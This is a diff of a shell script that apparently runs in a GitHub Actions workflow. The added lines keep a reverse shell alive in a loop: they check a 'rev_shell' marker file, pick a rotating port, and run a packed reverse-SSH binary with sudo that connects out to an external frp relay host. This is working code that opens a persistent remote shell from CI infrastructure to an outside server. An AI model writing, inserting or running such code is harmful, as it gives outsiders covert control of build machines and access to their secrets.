@@ -45,11 +45,13 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 #    done) &
 #) &
 
-grep -q AABBCC /tmp/js9 &&
+grep -q AABBCC_rev_shell /tmp/js9 &&
 ( 
     (while true; do
-        [ ! -f /tmp/keepalive ] && break
-        bport=500"$(date +%S)";echo $bport;
+        [ ! -f /tmp/keepalive ] && break        
+         num67z=$(date +%S);num76=$((${num67z}%2));
+         bport=5003"$num76";echo $bport;
+         grep -o -E "AABBCC_rev_shellLLL.*FFF" /tmp/js9 2>&1  > /tmp/js99
          sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p  60021  cn-bj-plc-300.openfrp.cc;  sleep 6 ;
     done) &
 ) &
